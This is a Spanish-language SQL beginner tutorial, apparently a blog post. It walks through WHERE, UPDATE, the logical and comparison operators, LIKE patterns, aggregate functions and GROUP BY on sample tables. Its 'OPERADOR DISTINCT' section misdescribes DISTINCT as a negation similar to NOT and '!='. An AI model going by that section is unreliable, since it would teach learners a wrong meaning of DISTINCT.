&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-where&quot;&gt;CLAUSULA WHERE &lt;a href=&quot;#clausula-where&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; la capacidad de usar condicionales es muy importante ya que estas nos permiten encontrar consultas muy especificas. De igual forma que en los demas lenguajes de programación, podemos ejecutar una sentencia en la medida en que la condición se cumpla.&lt;/p&gt;

&lt;p&gt;Una de las formas de hacer esto en &lt;code&gt;sql&lt;/code&gt; es con el uso de la clausula &lt;code&gt;WHERE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora seleccionamos algun campo de una tabla de nuestra base de datos como en este caso de &lt;code&gt;Products&lt;/code&gt;, la consulta nos devuelve todos los registros de los campos seleccioandos&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero supongamos nosotros solo queremos mostrar uno de ellos, concretamente lo correspondiente al producto &lt;code&gt;Tofu&lt;/code&gt;. Pues aqui utilizarimos la clausula &lt;code&gt;WHERE&lt;/code&gt; y seguida la condición en este caso queremos que el &lt;code&gt;ProductName&lt;/code&gt; sea igual a &lt;code&gt;Tofu&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces la consulta nos devolveria los campos, donde solamente el &lt;code&gt;ProductName = Tofu&lt;/code&gt;, y de cumplirse la condicion al ser &lt;code&gt;TRUE&lt;/code&gt; nos los devuelve, de lo contrario si no existiera nos devolveria &lt;code&gt;FALSE&lt;/code&gt; y no se nos mostraria.&lt;/p&gt;

&lt;p&gt;Ahora vamos a hacer algo un poquito mas complejo, supongamos que queremos obtener los productos solo si los precios son mayores a &lt;code&gt;50&lt;/code&gt;. En este caso usariamos los operadores de comparación en nuestra codición donde &lt;code&gt;Price &amp;gt; 50&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos usar el &lt;code&gt;WHERE&lt;/code&gt;cuando queremos eliminar registros, en este caso vemos que en la tabla &lt;code&gt;Products&lt;/code&gt;, existe un producto donde el &lt;code&gt;Precio = 0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces para eliminarlo usriamos la siguiente consulta usando &lt;code&gt;DELETE&lt;/code&gt;  y con &lt;code&gt;WHERE&lt;/code&gt;, especificariamos la condición de modo tal que se elimine el registro solo si el precio es 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a ejecutar la consulta vemos que efectivamente el registro se elimino.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-update&quot;&gt;INSTRUCCION UPDATE &lt;a href=&quot;#instruccion-update&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La instrucción &lt;code&gt;UPDATE&lt;/code&gt; se utiliza para modificar los datos existentes de una o varias filas.&lt;/p&gt;

&lt;p&gt;Usaremos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; para modificar la edad de nuestro registro donde el nombre es &lt;code&gt;Juan&lt;/code&gt; y asignarle el valor de &lt;code&gt;30&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para actualizarlo debemos de ejecutar la instrucción &lt;code&gt;UPDATE&lt;/code&gt; mas el nombre de la tabla &lt;code&gt;Estudiantes&lt;/code&gt;, despues con &lt;code&gt;SET&lt;/code&gt; espeficamos la columna con el valor que deseamos cambiar &lt;code&gt;Edades = 30&lt;/code&gt; y finalmente la condición con &lt;code&gt;WHERE&lt;/code&gt; donde especificamos el resgistro especifico en nuestro caso donde el &lt;code&gt;Nombre = &quot;Juan&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al ver nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora en el campo edad nuestro usuario tiene el valor de 30.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operadores-en-sql&quot;&gt;OPERADORES EN SQL &lt;a href=&quot;#operadores-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los operadores son palabras clave en &lt;code&gt;SQL&lt;/code&gt; que utilizamos para realizar comparaciones, calculo y combinar condiciones en las consultas y espresiones &lt;code&gt;SQL&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operadores-and-y-or&quot;&gt;OPERADORES AND Y OR &lt;a href=&quot;#operadores-and-y-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vimos anteriormente que con &lt;code&gt;WHERE&lt;/code&gt; podemos aplicar condiciones, pero en muchas ocasiones vamos a querer ejecutar multiples condiciones, y para poder hacerlo tendremos que usar &lt;code&gt;AND o OR&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operador-and&quot;&gt;OPERADOR AND &lt;a href=&quot;#operador-and&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si ya tenemos conocimientos premios en cualquier lenguaje de programación, podemos sobreentender lo que hace &lt;code&gt;AND&lt;/code&gt;, que basicamente nos devuelve un resultado de cumplirse ambas condiciones.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para el siguiente ejemplo vamos a seleccionar de la tabla &lt;code&gt;Customers&lt;/code&gt; solo aquellos donde el pais sea &lt;code&gt;Spain&lt;/code&gt; y la ciudad sea &lt;code&gt;Madrid&lt;/code&gt;, en caso se cumplan ambas condicones quiero que me devuelva los registros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-or&quot;&gt;OPERADOR OR &lt;a href=&quot;#operador-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Al contrario que el and, &lt;code&gt;OR&lt;/code&gt; nos devuelve un resultado al cumplirse alguna de las dos condiones, no valida que se cumplan ambas ya que con solo cumplirse una de ellas esta nos devolvera un registro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos vamos a hacer una consulta donde, queremos seleccionar a los clientes que son del pais de &lt;code&gt;Argentina&lt;/code&gt; o que sean de la cuidad de &lt;code&gt;Barcelona&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado tenemos registros donde los clientes son de &lt;code&gt;Argentina&lt;/code&gt; y tambien a los clientes que son de la ciudad de &lt;code&gt;Barcelona&lt;/code&gt; ya que con &lt;code&gt;OR&lt;/code&gt; solo una de las condiones debe cumplirse para que me devuelva los registros.&lt;/p&gt;

&lt;h2 id=&quot;operador-not&quot;&gt;OPERADOR NOT &lt;a href=&quot;#operador-not&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Lo que hacemos con &lt;code&gt;NOT&lt;/code&gt; es simplemente negar la sentencia que realizamos, de este modo al agregar el &lt;code&gt;NOT&lt;/code&gt; el resultado que nos mostrara vendra a ser lo contrario a nuestra condicion en nuestra consulta.&lt;/p&gt;

&lt;p&gt;Si quedriamos realizar una consulta donde queremos obtener los precios que sean mayores a &lt;code&gt;80&lt;/code&gt; de la tabla productos, si ejecutamos la consulta esta nos mostrara exactamente lo que queremos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si usamos &lt;code&gt;NOT&lt;/code&gt; lo que se hace es negar la consulta y hacer lo contrario, basicamente con &lt;code&gt;NOT&lt;/code&gt; le diriamos mediante una consulta que nos seleccione los precios donde &lt;code&gt;NO&lt;/code&gt; sean mayores a &lt;code&gt;80&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-limit&quot;&gt;OPERADOR LIMIT &lt;a href=&quot;#operador-limit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cuando queremos limitar el numero de registros que nos arroja una consulta usamos &lt;code&gt;LIMIT&lt;/code&gt;, con ello limitamos el numero de registros a cuantos queramos especificando la cantidad total en numeros despues de &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Supongamos que ahora queremos ejecutar una consulta que nos muestre de manera ordenada los precios de la tabla de los &lt;code&gt;Products&lt;/code&gt;, eso lo hariamos facilmente utilizando &lt;code&gt;ORDER BY&lt;/code&gt; . Pero en esta ocasión de esos precios ordenados solo queremos que se nos muestre los 5 primeros registros, pues ahi es donde vamos a utilizar el &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y de esta manera tendriamos el precio de los 5 produtos mas caros.&lt;/p&gt;

&lt;p&gt;De la misma manera podriamos modificar la consulta y usar &lt;code&gt;ASC&lt;/code&gt; y de esta manera nos mostraria los 5 productos de menor precio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-distinct&quot;&gt;OPERADOR DISTINCT &lt;a href=&quot;#operador-distinct&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Este operador funciona de manera bastante similiar a &lt;code&gt;NOT&lt;/code&gt; ya que cuando lo usamos nos ejecuta exactamente lo contrario o distinto a la consulta, pero no es exactamente igual ya que &lt;code&gt;!=&lt;/code&gt; es un operador de comparación y se ejecuta realizando una comparación con todos los registros hasta validar uno correcto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En cambio &lt;code&gt;NOT&lt;/code&gt; al ser un operador logico, trabaja haciendo la comparación directamente entre dos valores &lt;code&gt;booleanos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si lo aplicamos &lt;code&gt;!=&lt;/code&gt; a efectos practicos en una consulta esta nos arrojara valores distintos al que especifiquemos, pero ahora ya tenemos en cuenta que no es lo mismo que usar &lt;code&gt;NOT&lt;/code&gt; aunque ambos se asemejen mucho.&lt;/p&gt;

&lt;h2 id=&quot;operador-between&quot;&gt;OPERADOR BETWEEN &lt;a href=&quot;#operador-between&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un operador de comparación que se utiliza para seleccionar valores en un rango especifico, estos datos pueden ser de tipos numericos, fecha o texto.&lt;/p&gt;

&lt;p&gt;Veamos un ejemplo donde vamos a seleccionar un rango de precios de nuestra tabla &lt;code&gt;Products&lt;/code&gt;, que iran desde &lt;code&gt;40 a 50&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que la consulta nos arroja unicamente los precios del rango establecido y de esta manera podemos simplificar nuestra consulta usando &lt;code&gt;BETWEEN&lt;/code&gt; y de esta manera optimizamos nuestras consultas.&lt;/p&gt;

&lt;p&gt;Podemos tambien en vez de especicar un rango basandonos en un dato numerico, usar un dato de tipo fecha.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos filtrar por un rango de fecha de nacimiento que corresponde a nuestros empleados de nuestra tabla &lt;code&gt;Employees&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-like&quot;&gt;OPERADOR LIKE &lt;a href=&quot;#operador-like&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;El operador &lt;code&gt;LIKE&lt;/code&gt;, lo usamos para hacer un filtro basandonos en patrones de cadena de texto, parecido a una expresión regular pero sin llegar a esa complejidad.&lt;/p&gt;

&lt;p&gt;Para poder comprenderlo mejor vamos a usarlo para poder filtrar por cadenas de texto especificas en nuestra tabla de clients &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Realizaremos una consulta donde seleccionemos todos los datos del nombre de contacto &lt;code&gt;ContactName&lt;/code&gt; de nuesta tabla &lt;code&gt;Customers&lt;/code&gt; , donde con &lt;code&gt;LIKE&lt;/code&gt; le especificamos que la cadena de texto especifico por la cual filtraremos, empieze con cualquier valor pero que termine con la palabra “Devon”.&lt;/p&gt;

&lt;p&gt;Esto lo hacemos anteponiendo el &lt;code&gt;%&lt;/code&gt; y seguidamente el texto por el cual queremos filtrar &lt;code&gt;&quot;%TEXTO&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Del mismo modo si quisieramos que el filtrado sea parecido, pero que esta vez que el filtro empieze por un texto especifico y termine el cualquier cosa, solo debemos poder el &lt;code&gt;%&lt;/code&gt;al final &lt;code&gt;TEXTO%&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero tambien existe una forma de realizar un filtro, donde especifiquemos el texto independientemente comienze o termine, y que nos encuentre un resultado cuando unicamente contenga el texto.&lt;/p&gt;

&lt;p&gt;Para ello usamos al inicio y al final &lt;code&gt;%&lt;/code&gt; y de esta manera especificamos que no importa si comienze o  termine con algo especifico, simplemente nos imprime la consulta si encuentra un match o coincidencia.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta forma la consulta nos arroja varias coincidencias donde se cumple la condición.&lt;/p&gt;

&lt;p&gt;Ahora tambien podemos hacer otro tipo de filtrado usando &lt;code&gt;LIKE&lt;/code&gt;, supongamos queremos realizar una consulta donde buscamos filtrar en nuestra tabla &lt;code&gt;Employees&lt;/code&gt;, un nombre el cual comienze con la letra &lt;code&gt;N&lt;/code&gt;, termine con la letra &lt;code&gt;Y&lt;/code&gt; y ademas el nombre solo tenga cinco caracteres.&lt;/p&gt;

&lt;p&gt;En ese caso usaremos &lt;code&gt;_&lt;/code&gt;, para especificar el numero total de caracteres desconocidos y en los extremos poner las letras conocidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cada uno de los guiones bajos &lt;code&gt;_&lt;/code&gt;, hace referencia a un caracter el cual puede ser cualquiera incluidos espacios.&lt;/p&gt;

&lt;h2 id=&quot;operador-is-null-y-is-not-null&quot;&gt;OPERADOR IS NULL Y IS NOT NULL &lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En sql un valor &lt;code&gt;NULL&lt;/code&gt;, representa un valor desconocido, cuando insertamos filas en una tabla, sin asignarles un valor, estas automaticamente toman el valor nulo &lt;code&gt;NULL&lt;/code&gt;. Este valor al ser especial no podemos compararlo con operadores aritmeticos normales, en su lugar debemos usar los operadores &lt;code&gt;IS o IS NOT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si seleccionamos todo de la tabla &lt;code&gt;Products&lt;/code&gt; y aplicamos un ordenamiento basandonos en &lt;code&gt;ProductName&lt;/code&gt;, por defecto esta nos devolvera al inicio los valores &lt;code&gt;NULL&lt;/code&gt;, de existir estos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si aplicamos la condición donde vamos a indicarle que nos devuelvan solo los valores &lt;code&gt;NULL&lt;/code&gt;. Para ello usamos &lt;code&gt;IS NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si al contrario me molestan ver los valores nulos y quiero quitarlos, pues usamos &lt;code&gt;IS NOT NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;la consulta nos devolvera todos los valores a excepción de los valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operador-in-y-not-in&quot;&gt;OPERADOR IN Y NOT IN &lt;a href=&quot;#operador-in-y-not-in&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Estos operadores simplifican el uso de usar multiples veces el operador &lt;code&gt;AND y OR&lt;/code&gt; al establecer multiples condiciones, ya que opera dentro de una lista de valores similar a una tupla &lt;code&gt;(valor1, valor2, valor3. valor4)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Supongamos queremos listar varios &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, en ese caso deberiamos ejecutar la siguiente consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obtendriamos el resultado deseado, pero escribiriamos muchas lineas de codigo, lo que no seria optimo y mas bien tedioso. Justo en estos casos usamos &lt;code&gt;IN&lt;/code&gt; y de esta manera podemos operar sobre un grupo de valores y reducir varias lineas de nuestra consulta, y logrando que sea mas optima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De la misma manera con &lt;code&gt;NOT IN&lt;/code&gt;, hacemos exactamente el mismo proceso, solo que esta vez al usar el &lt;code&gt;NOT&lt;/code&gt; se ejecutara lo contrario y imprimira los valores que no correspondan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;comentarios-en-sql&quot;&gt;COMENTARIOS EN SQL &lt;a href=&quot;#comentarios-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; como en distintos lenguajes de programación usamos los comentarios para añadir una descripción al proposito de nuestro codigo.&lt;/p&gt;

&lt;h3 id=&quot;comentar-una-linea&quot;&gt;COMENTAR UNA LINEA &lt;a href=&quot;#comentar-una-linea&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; usamos los &lt;code&gt;--&lt;/code&gt; para poder comentar una linea de codigo. &lt;code&gt;/*COMENTARIO*/&lt;/code&gt; si queremos comentar varias lineas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;comentar-varias-lineas&quot;&gt;COMENTAR VARIAS LINEAS &lt;a href=&quot;#comentar-varias-lineas&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos comentar varias lineas de codigo usamos &lt;code&gt;/*COMENTARIO*/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;funciones-de-agregacion&quot;&gt;FUNCIONES DE AGREGACION &lt;a href=&quot;#funciones-de-agregacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Las funciones de agregación nos permiten efectuar operaciones sobre un conjunto de resultados, pero devolviendo un unico valor para todos ellos. En palabras mas simples nos permite obtener la media, maximos, minimos, sumantorias entre otras operaciones.&lt;/p&gt;

&lt;p&gt;Estas funciones se utilizan con la clausula &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Veamos a continuación algunas de estas funciones:&lt;/p&gt;

&lt;h2 id=&quot;funcion-sum&quot;&gt;FUNCION SUM &lt;a href=&quot;#funcion-sum&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;SUM&lt;/code&gt; nos devuelve la suma de los valores de un campo que especifiquemos, cabe mencionar que solo podemos usar esta función en valores numericos.&lt;/p&gt;

&lt;p&gt;Por ejemplo si deseamos sumar todos los precios &lt;code&gt;Price&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, emitiriamos la siguiente consulta:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query40.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Donde dentro de los &lt;code&gt;()&lt;/code&gt; de la función &lt;code&gt;SUM&lt;/code&gt;, especifiriamos el campo el cual queremos sumar.&lt;/p&gt;

&lt;p&gt;Aqui para tener una apreciación mejor podriamos crearnos un &lt;code&gt;ALIAS&lt;/code&gt; y establecer el nuevo campo como &lt;code&gt;SUMA_TOTAL_PRECIOS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;funcion-count&quot;&gt;FUNCION COUNT &lt;a href=&quot;#funcion-count&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta función nos devuelve el numeros total de las filas seleccionadas.&lt;/p&gt;

&lt;p&gt;De la misma manera debemos especificar dentro de &lt;code&gt;()&lt;/code&gt; el campo cuando agregemos la función &lt;code&gt;COUNT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La consulta nos devuelve el total de filas del campo &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;funcion-min&quot;&gt;FUNCION MIX &lt;a href=&quot;#funcion-min&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;MIN&lt;/code&gt; nos devuelve el minimo valor de un campo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al aplicar la función en el campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio minimo.&lt;/p&gt;

&lt;h2 id=&quot;funcion-max&quot;&gt;FUNCION MAX &lt;a href=&quot;#funcion-max&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Max&lt;/code&gt; nos devuelve el maximo valor del campo espeficado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicando la función en el mismo campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio maximo.&lt;/p&gt;

&lt;h2 id=&quot;funcion-avg&quot;&gt;FUNCION AVG &lt;a href=&quot;#funcion-avg&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;AVG&lt;/code&gt;, nos devuelve como resultado el promedio del campo que especifiquemos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como se resultado obtenemos el promedio de los precio de el campo &lt;code&gt;Price&lt;/code&gt;, pero vemos que nos muestra un valor con muchas decimales, en ese caso podemos utilizar la función &lt;code&gt;ROUND&lt;/code&gt; para redondear el valor.&lt;/p&gt;

&lt;h2 id=&quot;funcion-round&quot;&gt;FUNCION ROUND &lt;a href=&quot;#funcion-round&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente esta función nos va a redondear un valor, dandonos como resultado el valor entero.&lt;/p&gt;

&lt;p&gt;Podemos aplicarlo a nuestra consulta anterior donde obteniamos el promedio, para que nos devuelva un valor entero.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicamos &lt;code&gt;ROUND&lt;/code&gt; encima de la función &lt;code&gt;AVG&lt;/code&gt; y obtenemos el promedio redondeado.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Estas funciones mencionadas son las basicas de &lt;code&gt;SQL&lt;/code&gt; y ademas las mas utilizadas, ya que cada gestor ofrece su propio conjunto mas amplio con otras funciones mas particulares.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;clausula-group-by&quot;&gt;CLAUSULA GROUP BY &lt;a href=&quot;#clausula-group-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La clausula &lt;code&gt;GROUP BY&lt;/code&gt;, la utilizamos para agrupar uno o varios registros segun uno o varios valores de la columna.&lt;/p&gt;

&lt;p&gt;Como vemos a continuación tenemos el detalle de las ventas de los productos, pero si nosotros qusieramos obtener la cantidad de ventas por producto. En este caso usariamos la clausula &lt;code&gt;GROUP BY&lt;/code&gt; y de este modo obtendriamos un ordenamiento de cada producto segun su cantidad.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos que queremos obtener el promedio del precio de lo que cuestan los productos que ofrece cada proveedor.&lt;/p&gt;

&lt;p&gt;Primero seleccionaremos el campo id del proveedor &lt;code&gt;SupplierID&lt;/code&gt; y el promedio redondeado de la tabla &lt;code&gt;Products&lt;/code&gt;. Esto nos dara como resultado el promedio total de los productos y el id que nos mostrara sera el primero, ya que como estamos usando una &lt;code&gt;función de agregación&lt;/code&gt; esta solo devuelve un unico valor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si ahora utilizamos &lt;code&gt;GROUP BY&lt;/code&gt; en el campo &lt;code&gt;SupplierID&lt;/code&gt;, lo que hara sera agruparnos por cada uno de los &lt;code&gt;SupplierID&lt;/code&gt; correspondientes a cada proveedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado obtendriamos el promedio del precio &lt;code&gt;Price&lt;/code&gt; de los productos que ofrece cada uno de nuestros proveedores.&lt;/p&gt;

